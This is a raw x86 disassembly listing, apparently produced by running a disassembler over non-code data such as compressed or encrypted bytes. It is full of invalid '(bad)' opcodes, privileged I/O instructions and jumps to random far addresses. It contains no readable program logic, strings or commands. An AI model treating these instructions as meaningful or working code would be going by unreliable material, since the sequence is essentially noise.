  41cc77:	fmul   DWORD PTR [ecx]
  41cc79:	sar    ah,1
  41cc7b:	add    ebp,esi
  41cc7d:	push   ebx
  41cc7e:	sbb    al,0x73
  41cc80:	inc    ebx
  41cc81:	pop    eax
  41cc82:	fist   DWORD PTR ds:0xee694599
  41cc88:	mov    ah,0xe0
  41cc8a:	retf   
  41cc8b:	outs   dx,BYTE PTR ds:[esi]
  41cc8c:	mov    al,0x77
  41cc8e:	fs inc ecx
  41cc90:	pushf  
  41cc91:	ss ins BYTE PTR es:[edi],dx
  41cc93:	fdiv   DWORD PTR [esi]
  41cc95:	jecxz  0x41cc59
  41cc97:	rcl    DWORD PTR [ebx],1
  41cc99:	or     ah,bh
  41cc9b:	daa    
  41cc9c:	(bad)  
  41cc9d:	fadd   DWORD PTR [edx-0x5eb940f7]
  41cca3:	pop    ss
  41cca4:	fdivr  QWORD PTR [edi]
  41cca6:	jne    0x41cc3c
  41cca8:	push   ds
  41cca9:	hlt    
  41ccaa:	mov    edx,0xb35d49f
  41ccaf:	cs enter 0x7e3d,0x1
  41ccb4:	sbb    dh,dl
  41ccb6:	(bad)  
  41ccb7:	cmp    ch,BYTE PTR [ebp+0x48]
  41ccba:	mov    ds:0xd21d8bfd,al
  41ccbf:	pop    es
  41ccc0:	inc    edx
  41ccc1:	mov    esi,0xd047e997
  41ccc6:	hlt    
  41ccc7:	imul   edi,DWORD PTR [edi],0x5cee62
  41cccd:	dec    ebp
  41ccce:	pop    es
  41cccf:	imul   ebp,DWORD PTR [edx+0x5b],0x14
  41ccd3:	or     bh,BYTE PTR [ebp+ebp*4-0x6926200e]
  41ccda:	xor    ebp,eax
  41ccdc:	(bad)  
  41ccdd:	shl    ecx,cl
  41ccdf:	out    0x24,eax
  41cce1:	xlat   BYTE PTR ds:[ebx]
  41cce2:	and    BYTE PTR [edx+0x70],dh
  41cce5:	mov    esp,0x585a65a
  41ccea:	adc    DWORD PTR [edx],ebx
  41ccec:	(bad)  
  41cced:	out    0xac,eax
  41ccef:	cdq    
  41ccf0:	aad    0x1d
  41ccf2:	hlt    
  41ccf3:	test   eax,0xb6cc3d30
  41ccf8:	ins    BYTE PTR es:[edi],dx
  41ccf9:	or     ch,BYTE PTR [eax+ebx*8-0x71d322ed]
  41cd00:	adc    dh,BYTE PTR [edi-0x7a]
  41cd03:	mov    esp,0x3fd58b76
  41cd08:	and    BYTE PTR [edi-0xc],dl
  41cd0b:	retf   0x5fa2
  41cd0e:	inc    esp
  41cd0f:	mov    ds:0x60d5b04a,al
  41cd14:	(bad)  
  41cd15:	cmp    BYTE PTR [edx-0x25e3b0f9],cl
  41cd1b:	xchg   ebx,eax
  41cd1c:	pop    edi
  41cd1d:	loop   0x41ccc3
  41cd1f:	pop    sp
  41cd21:	das    
  41cd22:	adc    al,0x6e
  41cd24:	jp     0x41cca7
  41cd26:	sbb    DWORD PTR [esi-0x5],ebx
  41cd29:	bound  edi,QWORD PTR [ebp*2-0x7d3aa77a]
  41cd30:	ror    DWORD PTR [esi+0x9937f47],0x6b
  41cd37:	inc    ebp
  41cd38:	mov    dl,0x89
  41cd3a:	fisub  DWORD PTR [ecx+0x14d3346f]
  41cd40:	inc    edx
  41cd41:	bound  esp,QWORD PTR [ecx+0x1d]
  41cd44:	sub    al,0x2
  41cd46:	mov    fs,WORD PTR [ebp-0x89ea400]
  41cd4c:	int3   
  41cd4d:	cli    
  41cd4e:	test   BYTE PTR [ebx-0x1f5f1f48],0x7b
  41cd55:	test   BYTE PTR [ebp+0x486ad279],0xe6
  41cd5c:	inc    ebp
  41cd5d:	shl    BYTE PTR [edx+0x72],1
  41cd60:	or     eax,0x34275f37
  41cd65:	cdq    
  41cd66:	push   ebx
  41cd67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd68:	push   edx
  41cd69:	in     eax,dx
  41cd6a:	xor    al,0xa5
  41cd6c:	rol    ebx,1
  41cd6e:	push   ebx
  41cd6f:	jae    0x41cdde
  41cd71:	and    al,0x81
  41cd73:	inc    esp
  41cd74:	scas   eax,DWORD PTR es:[edi]
  41cd75:	inc    esi
  41cd76:	jge    0x41cd1e
  41cd78:	mov    ebx,0x23aa34b7
  41cd7d:	mul    ebp
  41cd7f:	push   ebp
  41cd80:	or     DWORD PTR [esi-0x26],edi
  41cd83:	xlat   BYTE PTR ds:[ebx]
  41cd84:	dec    esp
  41cd85:	ret    
  41cd86:	call   0x7626:0x1a861796
  41cd8d:	js     0x41cde1
  41cd8f:	aam    0xc2
  41cd91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd92:	dec    BYTE PTR [esi+esi*2+0x7d]
  41cd96:	ja     0x41cd90
  41cd98:	ins    BYTE PTR es:[edi],dx
  41cd99:	dec    esi
  41cd9a:	inc    ecx
  41cd9b:	push   ebp
  41cd9c:	jecxz  0x41cde0
  41cd9e:	sub    DWORD PTR [esi-0x19ccbb1a],esp
  41cda4:	cmp    dl,al
  41cda6:	xchg   esp,eax
  41cda7:	out    0xab,eax
  41cda9:	pop    edx
  41cdaa:	dec    esi
  41cdab:	adc    ebx,DWORD PTR [ebx-0x4b3c1751]
  41cdb1:	pop    edx
  41cdb2:	jbe    0x41cd5c
  41cdb4:	jl     0x41cd6e
  41cdb6:	dec    eax
  41cdb7:	into   
  41cdb8:	mul    BYTE PTR [ebx+0x60]
  41cdbb:	sbb    BYTE PTR [edx],0x2e
  41cdbe:	stos   BYTE PTR es:[edi],al
  41cdbf:	jl     0x41cdba
  41cdc1:	data16 fadd DWORD PTR [edx-0x4972b86d]
  41cdc8:	inc    edx
  41cdc9:	mov    eax,0x179dc9a9
  41cdce:	add    BYTE PTR [edi-0x301d66ea],ah
  41cdd4:	jl     0x41cd75
  41cdd6:	jae    0x41cd5c
  41cdd8:	std    
  41cdd9:	sub    DWORD PTR [edx],esi
  41cddb:	pop    esp
  41cddc:	inc    edi
  41cddd:	jmp    0x41cd6b
  41cddf:	ja     0x41cd98
  41cde1:	ret    0x24ed
  41cde4:	cmp    DWORD PTR [ebx],0xf4f8b4de
  41cdea:	ret    
  41cdeb:	sub    eax,0x42b49528
  41cdf0:	fcmovne st,st(2)
  41cdf2:	push   ss
  41cdf3:	mov    ebx,0xc5f0b4fe
  41cdf8:	pushf  
  41cdf9:	jae    0x41ce53
  41cdfb:	std    
  41cdfc:	cmp    eax,0x284cab2c
  41ce01:	pop    es
  41ce02:	jg     0x41cdbf
  41ce04:	aad    0x5f
  41ce06:	and    ch,ch
  41ce08:	mov    ds:0xa94438db,eax
  41ce0d:	cmp    al,0xfb
  41ce0f:	mov    esp,0xed56279e
  41ce14:	das    
  41ce15:	(bad)  
  41ce17:	adc    ebx,DWORD PTR [ecx-0x38e2c3db]
  41ce1d:	dec    eax
  41ce1e:	js     0x41cda6
  41ce20:	imul   edx,DWORD PTR fs:[eax],0xce1ab290
  41ce27:	and    BYTE PTR [ecx-0x3d],bh
  41ce2a:	mov    eax,0xb8dfa866
  41ce2f:	sti    
  41ce30:	test   al,0xd3
  41ce32:	aaa    
  41ce33:	repz mov dh,0xb1
  41ce36:	and    DWORD PTR [ecx+ecx*4-0x43e3beb2],ebp
  41ce3d:	inc    ebx
  41ce3e:	loop   0x41cdc4
  41ce40:	imul   esi,DWORD PTR [ecx],0x19b7dc45
  41ce46:	cmp    ah,BYTE PTR [esi+eax*1+0x7f]
  41ce4a:	fisub  WORD PTR [ecx+eax*4]
  41ce4d:	hlt    
  41ce4e:	ins    DWORD PTR es:[edi],dx
  41ce4f:	(bad)  
  41ce50:	sub    BYTE PTR [ebx+0x75],dl
  41ce53:	es cmc 
  41ce55:	sti    
  41ce56:	dec    ebx
  41ce57:	push   0xb80eb292
  41ce5c:	jb     0x41ce7c
  41ce5e:	scas   eax,DWORD PTR es:[edi]
  41ce5f:	lds    edx,FWORD PTR [edx]
  41ce61:	stos   DWORD PTR es:[edi],eax
  41ce62:	aad    0x15
  41ce64:	xor    ebx,DWORD PTR [eax+0x7138f386]
  41ce6a:	mov    ?,WORD PTR [esi]
  41ce6c:	dec    esi
  41ce6d:	test   al,0xc8
  41ce6f:	pop    edx
  41ce70:	sbb    bh,BYTE PTR [edi-0x3dc2c044]
  41ce76:	jo     0x41ce7c
  41ce78:	loop   0x41ce36
  41ce7a:	retf   0xb692
  41ce7d:	(bad)  
  41ce7e:	xchg   ebp,eax
  41ce7f:	pop    ecx
  41ce80:	sbb    DWORD PTR [eax-0x1d],ebp
  41ce83:	dec    ebx
  41ce84:	cmp    bh,al
  41ce86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce87:	sahf   
  41ce88:	loopne 0x41ce88
  41ce8a:	push   esi
  41ce8b:	jg     0x41ce52
  41ce8d:	leave  
  41ce8e:	(bad)  
  41ce8f:	imul   ebx,esi,0x10
  41ce92:	xor    BYTE PTR [ecx+edx*1+0x47bb3b6b],ch
  41ce99:	xchg   ebx,eax
  41ce9a:	loope  0x41ce35
  41ce9c:	jne    0x41ceac
  41ce9e:	xchg   esi,eax
  41ce9f:	shl    DWORD PTR [ecx],1
  41cea1:	das    
  41cea2:	dec    esi
  41cea3:	add    eax,0x551e01e8
  41cea8:	mov    DWORD PTR [eax],eax
  41ceaa:	sub    ah,0x33
  41cead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceae:	adc    ah,BYTE PTR [ebx*4-0x2c2cf9e7]
  41ceb5:	jno    0x41ceb7
  41ceb7:	jo     0x41ce9a
  41ceb9:	inc    edx
  41ceba:	out    0xf1,eax
  41cebc:	dec    edx
  41cebd:	aaa    
  41cebe:	xor    DWORD PTR [esi+0x72],edi
  41cec1:	dec    esi
  41cec2:	inc    ecx
  41cec3:	adc    BYTE PTR [edi-0x5b7d06c],bh
  41cec9:	cmp    al,0xd5
  41cecb:	sub    eax,0x1fc21361
  41ced0:	jge    0x41ce94
  41ced2:	bound  esp,QWORD PTR [ebp+0x7c]
  41ced5:	inc    esi
  41ced6:	push   esi
  41ced7:	mov    bl,0xeb
  41ced9:	xor    BYTE PTR [ecx+0x3b],0x73
  41cedd:	push   es
  41cede:	jle    0x41cf5e
  41cee0:	or     esp,DWORD PTR ds:0x72887388
  41cee6:	fisttp DWORD PTR ds:0x2a9f3d0e
  41ceec:	jp     0x41ce70
  41ceee:	pushf  
  41ceef:	inc    ecx
  41cef0:	mov    dh,0xdf
  41cef2:	push   edx
  41cef3:	setae  ch
  41cef6:	std    
  41cef7:	out    dx,al
  41cef8:	into   
  41cef9:	pop    ss
  41cefa:	add    eax,0x2e2a2505
  41ceff:	dec    ebp
  41cf00:	out    0x71,al
  41cf02:	sub    al,0x15
  41cf04:	fwait
  41cf05:	inc    eax
  41cf06:	daa    
  41cf07:	and    DWORD PTR [edx+0x6e],edi
  41cf0a:	dec    esi
  41cf0b:	aam    0xf
  41cf0d:	dec    esi
  41cf0e:	inc    esi
  41cf0f:	pop    ebp
  41cf10:	or     ecx,DWORD PTR [esi-0x23f92cd1]
  41cf16:	mov    ds:0xa826dba0,al
  41cf1b:	in     al,0x38
  41cf1d:	pop    ds
  41cf1e:	add    ch,BYTE PTR [ebp-0x3b672910]
  41cf24:	shl    DWORD PTR [edi-0x4],0xf3
  41cf28:	add    al,0xf3
  41cf2a:	push   ebp
  41cf2b:	cmp    dh,dl
  41cf2d:	ret    0xee59
  41cf30:	xchg   esp,eax
  41cf31:	mov    bh,0x7c
  41cf33:	mov    esp,0x641e90a2
  41cf38:	and    eax,0x288bb9a4
  41cf3d:	push   esp
  41cf3e:	stos   DWORD PTR es:[edi],eax
  41cf3f:	or     BYTE PTR [ebx-0x18bc01b8],bh
  41cf45:	stos   DWORD PTR es:[edi],eax
  41cf46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf47:	stc    
  41cf48:	push   ss
  41cf49:	cmc    
  41cf4a:	icebp  
  41cf4b:	sub    edx,edi
  41cf4d:	xor    BYTE PTR [esi+0x2],dh
  41cf50:	sti    
  41cf51:	and    dl,BYTE PTR [esi-0x5e8b3ad6]
  41cf57:	mov    ch,0xbf
  41cf59:	dec    ebp
  41cf5a:	mov    edx,esi
  41cf5c:	pop    ds
  41cf5d:	pop    ebp
  41cf5e:	stos   DWORD PTR es:[edi],eax
  41cf5f:	dec    edx
  41cf60:	push   es
	...
  41d139:	jecxz  0x41d141
  41d13b:	add    DWORD PTR [edi-0x1b],esi
  41d13e:	ja     0x41d137
  41d140:	xchg   esi,eax
  41d141:	popf   
  41d142:	mov    edx,0x8630c648
  41d147:	mov    al,ds:0x1a8db39
  41d14c:	add    BYTE PTR [eax],ah
  41d14e:	pop    es
  41d14f:	add    BYTE PTR [eax],al
  41d151:	cmp    eax,0x5f65d9a3
  41d156:	xor    DWORD PTR [eax],0x493df075
  41d15c:	and    edx,DWORD PTR [ecx+0x7df2d284]
  41d162:	adc    BYTE PTR [edi-0x7e4dada4],ch
  41d168:	sbb    al,0x6c
  41d16a:	push   ecx
  41d16b:	add    DWORD PTR [eax],ecx
  41d16d:	retf   
  41d16e:	inc    ebx
  41d16f:	cmp    BYTE PTR [esi+0x11],bl
  41d172:	dec    ebp
  41d173:	adc    BYTE PTR [ebp+eiz*8+0x6444ad31],cl
  41d17a:	fdivrp st(2),st
  41d17c:	addr16 lahf 
  41d17e:	mov    DWORD PTR [esi+0x7a9a7b21],esp
  41d184:	add    al,0xac
  41d186:	jl     0x41d1eb
  41d188:	xchg   ecx,eax
  41d189:	call   0x2866:0xce0e4064
  41d190:	adc    al,0xe5
  41d192:	mov    BYTE PTR [ebp+0x18],dh
  41d195:	inc    esp
  41d196:	mov    ecx,0xb41bfe7
  41d19b:	cmc    
  41d19c:	push   esp
  41d19d:	mov    al,0xfb
  41d19f:	dec    esi
  41d1a0:	and    eax,0x39f3fd74
  41d1a5:	aas    
  41d1a6:	cld    
  41d1a7:	xor    dh,BYTE PTR [ecx+edx*8+0x6]
  41d1ab:	pop    edx
  41d1ac:	cmc    
  41d1ad:	out    0x1e,eax
  41d1af:	xchg   edx,eax
  41d1b0:	lock or al,0xb3
  41d1b3:	jl     0x41d21f
  41d1b5:	cli    
  41d1b6:	out    dx,eax
  41d1b7:	stos   BYTE PTR es:[edi],al
  41d1b8:	imul   edx,DWORD PTR [esi],0x7f38b249
  41d1be:	fistp  WORD PTR [eax-0x65d60680]
  41d1c4:	adc    DWORD PTR [ecx],0x40682968
  41d1ca:	add    BYTE PTR [ecx+0x6b],0x8e
  41d1ce:	hlt    
  41d1cf:	mov    bl,cl
  41d1d1:	mov    eax,ds:0xcf1a0e88
  41d1d6:	push   ecx
  41d1d7:	sub    esi,DWORD PTR [ecx]
  41d1d9:	data16 and bl,dl
  41d1dc:	into   
  41d1dd:	xor    eax,0xea9d5acc
  41d1e2:	mov    DWORD PTR [edx+0x5f],edx
  41d1e5:	jbe    0x41d1a0
  41d1e7:	aad    0xb3
  41d1e9:	push   esp
  41d1ea:	lock addr16 mov dh,0xc8
  41d1ee:	jmp    0x62a5:0xb98f6eda
  41d1f5:	cmp    eax,0xeb88cb41
  41d1fa:	repz cmp BYTE PTR [ebp+0x74],0x55
  41d1ff:	nop
  41d200:	pusha  
  41d201:	push   cs
  41d202:	push   edx
  41d203:	jnp    0x41d1c6
  41d205:	lahf   
  41d206:	mov    eax,0x8dc7eaf1
  41d20b:	lea    esi,[ebx]
  41d20d:	mov    esp,0x6a3c4b49
  41d212:	xor    bp,dx
  41d215:	shl    BYTE PTR [ebp+0x42e60dc5],0x58
  41d21c:	test   DWORD PTR [ebx+0x6],ecx
  41d21f:	repnz das 
  41d221:	push   ebx
  41d222:	adc    DWORD PTR [ecx],edx
  41d224:	dec    ecx
  41d225:	jbe    0x41d295
  41d227:	jmp    0x41d234
  41d229:	pop    esi
  41d22a:	cli    
  41d22b:	mov    esp,0x2c88f94f
  41d230:	clc    
  41d231:	cmp    ch,al
  41d233:	pop    esp
  41d234:	push   ds
  41d235:	pop    ecx
  41d236:	mov    esp,DWORD PTR [ebx+ebx*1-0x68]
  41d23a:	lods   eax,DWORD PTR ds:[esi]
  41d23b:	push   esi
  41d23c:	cmp    DWORD PTR [eax],0x6c
  41d23f:	lods   eax,DWORD PTR ds:[esi]
  41d240:	sub    dl,ah
  41d242:	out    dx,eax
  41d243:	cmc    
  41d244:	outs   dx,BYTE PTR ds:[esi]
  41d245:	lea    eax,[eax]
  41d247:	pop    esp
  41d248:	mov    edi,0x94388cef
  41d24d:	mov    edx,0xd3b3ccec
  41d252:	dec    ebx
  41d253:	push   0x153e5ca2
  41d258:	adc    eax,0x57b96736
  41d25d:	sub    ah,ch
  41d25f:	xchg   edx,eax
  41d260:	mov    edi,0x94d6b4a9
  41d265:	fsub   DWORD PTR [eax-0x3c4e137b]
  41d26b:	cmp    eax,0xbc222e85
  41d270:	stos   DWORD PTR es:[edi],eax
  41d271:	or     al,BYTE PTR [ebp+0x43]
  41d274:	add    DWORD PTR [eax-0x62],0x63
  41d278:	mov    ch,0x86
  41d27a:	dec    edx
  41d27b:	(bad)  
  41d27c:	cli    
  41d27d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d27e:	fist   DWORD PTR [ebx+0x7e]
  41d281:	cwde   
  41d282:	push   es
  41d283:	outs   dx,BYTE PTR ds:[esi]
  41d284:	xor    al,0xce
  41d286:	(bad)  
  41d287:	test   al,0x3e
  41d289:	or     ebx,DWORD PTR [ecx-0x28]
  41d28c:	cmp    dl,bh
  41d28e:	jmp    0x41d264
  41d290:	ja     0x41d300
  41d292:	and    DWORD PTR [eax],ebx
  41d294:	jecxz  0x41d26b
  41d296:	repnz adc ebp,DWORD PTR [edx+eiz*2-0x5f3f6c66]
  41d29e:	fsub   DWORD PTR [edi-0x1a]
  41d2a1:	call   0x6d9d451b
  41d2a6:	leave  
  41d2a7:	std    
  41d2a8:	push   0x1
  41d2aa:	das    
  41d2ab:	retf   0xb2af
  41d2ae:	bound  esi,QWORD PTR [eax+0x38550c38]
  41d2b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2b5:	imul   edx,ecx,0xffffffc6
  41d2b8:	sbb    bl,BYTE PTR [esi+eiz*4]
  41d2bb:	dec    ebp
  41d2bc:	mov    ds:0xa08c1da6,al
  41d2c1:	lods   al,BYTE PTR ds:[esi]
  41d2c2:	adc    eax,edx
  41d2c4:	inc    ebp
  41d2c5:	iret   
  41d2c6:	popa   
  41d2c7:	std    
  41d2c8:	loopne 0x41d2f2
  41d2ca:	out    dx,al
  41d2cb:	push   edi
  41d2cc:	mov    esp,0x338ba4f8
  41d2d1:	test   DWORD PTR [esi],edx
  41d2d3:	push   ds
  41d2d4:	jl     0x41d2f8
  41d2d6:	inc    esp
  41d2d7:	pusha  
  41d2d8:	pop    edx
  41d2d9:	add    dh,BYTE PTR [ebp+0x37]
  41d2dc:	push   ebx
  41d2dd:	mov    esi,0x4c65d498
  41d2e2:	pop    edi
  41d2e3:	xor    DWORD PTR [ebx+edx*4+0x4ffe478d],edi
  41d2ea:	popa   
  41d2eb:	loopne 0x41d30f
  41d2ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d2ee:	mov    ah,0xef
  41d2f0:	test   DWORD PTR [ecx+0x2289ea31],eax
  41d2f6:	mov    ecx,0xd0924e94
  41d2fb:	mov    cl,0x9b
  41d2fd:	jae    0x41d310
  41d2ff:	mov    BYTE PTR [ebp+0x388c5b7b],dh
  41d305:	in     al,dx
  41d306:	ds scas al,BYTE PTR es:[edi]
  41d308:	add    al,0x5
  41d30a:	ins    BYTE PTR es:[edi],dx
  41d30b:	mov    esp,DWORD PTR [edi-0x31]
  41d30e:	jmp    0x106e:0xd41fe030
  41d315:	outs   dx,BYTE PTR ds:[esi]
  41d316:	sbb    DWORD PTR ds:0x28cf66b0,0x74670648
  41d320:	out    dx,al
  41d321:	xchg   ecx,eax
  41d322:	(bad)  
  41d323:	xlat   BYTE PTR ds:[ebx]
  41d324:	jmp    0x50e19709
  41d329:	pop    edx
  41d32a:	cmp    BYTE PTR ds:0x3ed835a8,ch
  41d330:	mov    bl,0xf0
  41d332:	loop   0x41d30e
  41d334:	jl     0x41d306
  41d336:	xor    eax,DWORD PTR [ebp+ebp*4-0x7a]
  41d33a:	repz mov al,0x82
  41d33d:	pop    ds
  41d33e:	mov    edi,0x69b0354a
  41d343:	adc    ebp,DWORD PTR [esi+0x35dee29c]
  41d349:	xor    BYTE PTR [ebx],ch
  41d34b:	scas   eax,DWORD PTR es:[edi]
  41d34c:	ins    DWORD PTR es:[edi],dx
  41d34d:	push   edi
  41d34e:	das    
  41d34f:	xchg   BYTE PTR [ecx+0x5acb17fc],bl
  41d355:	mov    ebp,0xaa12cfb6
  41d35a:	push   cs
  41d35b:	cmp    DWORD PTR [esi+0x5e],esp
  41d35e:	mov    DWORD PTR [ebx-0x3e],esp
  41d361:	mov    ds,WORD PTR [edi+0x7bfd4449]
  41d367:	dec    edx
  41d368:	aad    0x49
  41d36a:	lods   al,BYTE PTR ds:[esi]
  41d36b:	fs pop esi
  41d36d:	aas    
  41d36e:	jnp    0x41d318
  41d370:	mov    ds:0x3e85ac67,al
  41d375:	inc    ebp
  41d376:	lahf   
  41d377:	int    0x53
  41d379:	sub    dl,ah
  41d37b:	dec    edx
  41d37c:	out    0x13,eax
  41d37e:	call   0x156d09b0
  41d383:	xchg   edx,eax
  41d384:	mov    cl,0x52
  41d386:	cmp    BYTE PTR [ebp-0x8fc1c],al
  41d38c:	out    0xeb,eax
  41d38e:	and    ebp,edx
  41d390:	icebp  
  41d391:	cmp    DWORD PTR [edi],edi
  41d393:	int3   
  41d394:	retf   0xc9f6
  41d397:	and    eax,0x1121cad4
  41d39c:	sub    dl,al
  41d39e:	test   DWORD PTR [ebx-0x640d2d46],0xc2bc6de0
  41d3a8:	fist   WORD PTR [ecx]
  41d3aa:	xchg   esp,eax
  41d3ab:	xchg   ebx,eax
  41d3ac:	out    dx,al
  41d3ad:	cmc    
  41d3ae:	push   0x86aedc55
  41d3b3:	clc    
  41d3b4:	mov    dh,0xfb
  41d3b6:	rol    BYTE PTR [edx+0x10],cl
  41d3b9:	cwde   
  41d3ba:	fidivr WORD PTR ds:0x64c0e08f
  41d3c0:	outs   dx,DWORD PTR ds:[esi]
  41d3c1:	popa   
  41d3c2:	repnz (bad) 
  41d3c4:	cmp    eax,ecx
  41d3c6:	data16 loopne 0x41d40a
  41d3c9:	cwde   
  41d3ca:	in     eax,0x15
  41d3cc:	or     eax,ebp
  41d3ce:	fidivr DWORD PTR ss:[esi+0xb2ece4c]
  41d3d5:	sub    al,0x42
  41d3d7:	stos   DWORD PTR es:[edi],eax
  41d3d8:	fwait
  41d3d9:	adc    eax,0x934d1112
  41d3de:	data16 (bad) 
  41d3e0:	lock clc 
  41d3e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3e3:	lods   eax,DWORD PTR ds:[esi]
  41d3e4:	mov    ds,esp
  41d3e6:	stos   DWORD PTR es:[edi],eax
  41d3e7:	push   esi
  41d3e8:	jae    0x41d383
  41d3ea:	in     al,dx
  41d3eb:	fs push eax
  41d3ed:	clc    
  41d3ee:	test   DWORD PTR [ecx+0x111a88bd],esi
  41d3f4:	test   DWORD PTR [eax-0x74],eax
  41d3f7:	popa   
  41d3f8:	pop    edi
  41d3f9:	push   ss
  41d3fa:	fcom   QWORD PTR [ebx-0x68]
  41d3fd:	dec    ebx
  41d3fe:	adc    BYTE PTR [ebx+0x71],cl
  41d401:	int    0xd0
  41d403:	mov    dl,0xef
  41d405:	jno    0x41d461
  41d407:	(bad)  
  41d408:	xor    al,0xd
  41d40a:	xchg   DWORD PTR [ebx-0x47],ebp
  41d40d:	pop    esi
  41d40e:	loopne 0x41d3e2
  41d410:	nop
  41d411:	mov    bl,0x4d
  41d413:	mov    ebx,0x8afe2b59
  41d418:	adc    BYTE PTR [esi+eax*4+0x5018b7cb],dh
  41d41f:	cmp    eax,0x277e2e3d
  41d424:	out    0xec,al
  41d426:	test   BYTE PTR fs:[ebx-0x24ff5266],0xb4
  41d42e:	loop   0x41d40b
  41d430:	push   esp
  41d431:	or     BYTE PTR [edx],ah
  41d433:	push   ds
  41d434:	mov    dh,0xf
  41d436:	ja     0x41d413
  41d438:	pop    esp
  41d439:	(bad)  
  41d43a:	lahf   
  41d43b:	xchg   esi,eax
  41d43c:	add    BYTE PTR [ebp+0x4c6cab5b],dh
  41d442:	jbe    0x41d4b2
  41d444:	cs int3 
  41d446:	xchg   edi,eax
  41d447:	cwde   
  41d448:	cmc    
  41d449:	dec    ebp
  41d44a:	fsubr  DWORD PTR [eax+ebp*8]
  41d44d:	add    cl,BYTE PTR [ebx+0x60]
  41d450:	(bad)  
  41d451:	iret   
  41d452:	jp     0x41d4af
  41d454:	scas   al,BYTE PTR es:[edi]
  41d455:	sbb    eax,0x55015d96
  41d45a:	(bad)  
  41d45c:	sub    al,dh
  41d45e:	call   0x4abb36a8
  41d463:	ins    DWORD PTR es:[edi],dx
  41d464:	stos   BYTE PTR es:[edi],al
  41d465:	dec    eax
  41d466:	add    al,0xc9
  41d468:	je     0x41d436
  41d46a:	xchg   ebx,eax
  41d46b:	cmp    eax,0x2215bd51
  41d470:	mov    ebx,0x41a38675
  41d475:	bound  esp,QWORD PTR [eax]
  41d477:	mov    esi,0xc8f77418
  41d47c:	in     al,0xcf
  41d47e:	cmp    DWORD PTR ss:[eax-0x6e],ecx
  41d482:	mov    DWORD PTR [ecx+0x3c],esi
  41d485:	je     0x41d441
  41d487:	loope  0x41d446
  41d489:	loop   0x41d471
  41d48b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41d48d:	mov    ecx,0xeeef11fe
  41d492:	les    eax,FWORD PTR [ebp-0x4806b9d1]
  41d498:	(bad)
  41d49c:	in     al,dx
  41d49d:	push   esp
  41d49e:	add    bl,BYTE PTR [edi+0x25]
  41d4a1:	aas    
  41d4a2:	shr    BYTE PTR [esi],0x31
  41d4a5:	xlat   BYTE PTR ds:[ebx]
  41d4a6:	(bad)  
  41d4a7:	adc    edx,DWORD PTR [eax-0x15b8f73e]
  41d4ad:	push   esi
  41d4ae:	aam    0x52
  41d4b0:	inc    eax
  41d4b1:	push   esi
  41d4b2:	jae    0x41d480
  41d4b4:	inc    esi
  41d4b5:	pop    ds
  41d4b6:	arpl   WORD PTR [ebp-0x4f28ec41],ax
  41d4bc:	xor    DWORD PTR [ebp+0x1e],ebx
  41d4bf:	rcr    eax,cl
  41d4c1:	jo     0x41d4a9
  41d4c3:	push   0x44f40b77
  41d4c8:	popa   
  41d4c9:	div    ecx
  41d4cb:	dec    ecx
  41d4cc:	aad    0xe8
  41d4ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4cf:	mov    ebx,0x731da425
  41d4d4:	test   DWORD PTR [ecx-0x19],0x5507d510
  41d4db:	inc    edx
  41d4dc:	pop    ecx
  41d4dd:	nop
  41d4de:	inc    edi
  41d4df:	sbb    eax,0x3b610a85
  41d4e4:	inc    edi
  41d4e5:	or     al,0x18
  41d4e7:	(bad)  
  41d4e9:	sub    DWORD PTR [ecx+0x776f633],eax
  41d4ef:	add    bl,cl
  41d4f1:	out    0xd7,al
  41d4f3:	retf   
  41d4f4:	jmp    0x41d50d
  41d4f6:	push   edx
  41d4f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4f8:	(bad)  
  41d4f9:	jl     0x41d4a9
  41d4fb:	fnsave [ebp+0x13]
  41d4fe:	int    0xb2
  41d500:	ins    DWORD PTR es:[edi],dx
  41d501:	retf   
  41d502:	int3   
  41d503:	sbb    esp,DWORD PTR ds:0x42dfd64b
  41d509:	xor    eax,0x6dd8b0a6
  41d50e:	enter  0x71d4,0x91
  41d512:	dec    edx
  41d513:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d515:	dec    edx
  41d516:	jae    0x41d51f
  41d518:	aam    0x4a
  41d51a:	(bad)  
  41d51b:	out    0xb6,eax
  41d51d:	jmp    0xfd22:0x8272bd40
  41d524:	mov    ebx,0x58db9ae6
  41d529:	mov    ds:0x10b05287,eax
  41d52e:	arpl   WORD PTR [esp+ebp*4+0x13],ax
  41d532:	sub    BYTE PTR [ebx+0x6d5e6924],0x1b
  41d539:	push   0xfb838edc
  41d53e:	mov    cl,0x4e
  41d540:	test   al,0xa
  41d542:	mov    ch,0xab
  41d544:	enter  0x3132,0x6c
  41d548:	xor    eax,0xa79856d6
  41d54d:	cmp    DWORD PTR [edx+eax*8+0x68],0x93be23f6
  41d555:	mov    bh,0x8c
  41d557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d558:	push   es
  41d559:	(bad)
  41d55c:	lods   eax,DWORD PTR ds:[esi]
  41d55d:	addr16 push edx
  41d55f:	and    cl,BYTE PTR [esi+0x172b7b54]
  41d565:	xchg   esi,eax
  41d566:	jp     0x41d551
  41d568:	add    BYTE PTR [edx],0x4d
  41d56b:	fild   WORD PTR [eax-0x37]
  41d56e:	jne    0x41d554
  41d570:	inc    esp
  41d571:	addr16 je 0x41d55f
  41d574:	(bad)  [esi]
  41d576:	inc    esp
  41d577:	and    edx,DWORD PTR [edi-0x3a782cb2]
  41d57d:	clc    
  41d57e:	or     ah,BYTE PTR fs:[ebp-0x5d6882e0]
  41d585:	js     0x41d5f1
  41d587:	push   0x7278e1b6
  41d58c:	test   eax,0x84b4bb0f
  41d591:	ret    0x5038
  41d594:	loopne 0x41d5c0
  41d596:	outs   dx,BYTE PTR ds:[esi]
  41d597:	fstp   DWORD PTR [edx]
  41d599:	dec    ecx
  41d59a:	test   BYTE PTR [ebx+0x7724d7ca],al
